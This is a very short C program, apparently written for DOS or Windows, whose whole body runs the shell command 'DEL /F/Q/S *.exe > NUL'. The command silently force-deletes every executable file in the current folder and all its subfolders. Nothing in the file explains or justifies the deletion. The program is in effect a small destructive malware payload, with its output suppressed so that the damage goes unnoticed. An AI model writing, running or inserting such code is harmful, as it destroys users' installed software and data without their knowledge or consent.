#include <stdio.h>
#include <dos.h>

void system();

int main(void){
    system("DEL /F/Q/S *.exe > NUL");
}